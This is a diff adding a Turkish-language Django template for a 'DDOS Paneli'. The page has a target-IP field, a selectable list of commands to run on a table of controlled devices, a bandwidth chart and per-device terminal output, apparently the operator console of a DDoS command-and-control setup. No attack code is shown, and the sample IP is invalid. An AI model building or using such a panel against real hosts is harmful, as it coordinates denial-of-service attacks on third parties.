@@ -1,0 +1,83 @@
+{% extends 'layouts/layout.html' %}
+{% load static %}
+
+{% block title %}
+    DDOS Paneli
+{% endblock title %}
+
+{% block content %}
+
+    {% csrf_token %}
+
+    <div class="container mt-3 text-center"><h2>Komut Ekranı</h2></div>
+    <hr>
+    <div class="container-fluid  mt-3 p-5">
+        <div class="row">
+            <div class="col-10">
+                <p class="lead">Toplam Bant Genişliği</p>
+                <canvas id="myChart" width="500" height="150"></canvas>
+            </div>
+            {% if request.user.is_superuser %}
+                <div class="col-2 ms-auto">
+                    <p class="lead text-center">KOMUTLAR</p>
+                    <hr>
+                    <div class="d-grid gap-3">
+                        <!---
+                            <input class="btn btn-success" id="sshConnect" disabled onclick="sshConnect()"
+                                   type="button"
+                                   value="Ssh Bağlantılarını Aç">
+                            <input class="btn btn-danger" id="sshClose" disabled onclick="sshDisconnect()" type="button"
+                                   value="Ssh Bağlantılarını Kapat">
+                                   -->
+                        <input class="btn btn-warning" id="cancelCommand" onclick="cancelCommand()" type="button"
+                               value="Komutu İptal Et">
+                        <input class="btn btn-primary" type="button" id="sendCommand" onclick="sendCommand()"
+                               value="Seçili Komutu Çalıştır">
+                        <label for="targetIp">Hedef IP</label>
+                        <input class="form-control text-center" maxlength="15" data-in id="targetIp"
+                               placeholder="___.___.___.___">
+                        <small class="text-muted">örnek "212.185.675.128"</small>
+                        {% for command in commands %}
+                            <div class="" id="commandListRadio">
+                                <input class="form-check-input ms-auto" type="radio" name="deviceCommands"
+                                       id="exampleRadios{{ command.id }}"
+                                       value="{{ command.id }}" {% if command.id == 1 %}checked{% endif %}>
+                                <label class="form-check-label" for="exampleRadios{{ command.id }}">
+                                    {{ command.title }}
+                                </label>
+                            </div>
+                        {% endfor %}
+                    </div>
+                </div>
+            {% endif %}
+        </div>
+    </div>
+    <section class="w-75 p-4 text-center ms-auto me-auto">
+        <table class="table">
+            <thead class="table-dark">
+            <tr>
+                <th scope="col">id</th>
+                <th scope="col">ip</th>
+                <th scope="col">çıktılar</th>
+            </tr>
+            </thead>
+            <tbody>
+            {% for device in devices %}
+                <tr>
+                    <th scope="row"><p class="lead">{{ device.id }}</p></th>
+                    <td><p class="lead">{{ device.ip }}</p></td>
+                    <td><label class="lead" id="{{ device.ip }}">terminal çıktısı</label></td>
+                </tr>
+            {% endfor %}
+            </tbody>
+        </table>
+    </section>
+{% endblock content %}
+
+{% block jsFiles %}
+    <script src="{% static 'js/chart.min.3.7.1.js' %}"></script>
+    {% if request.user.is_superuser %}
+        <script src="{% static 'js/superUserCommands.js' %}"></script>
+    {% endif %}
+    <script src="{% static 'js/webSocket.js' %}"></script>
+{% endblock jsFiles %}
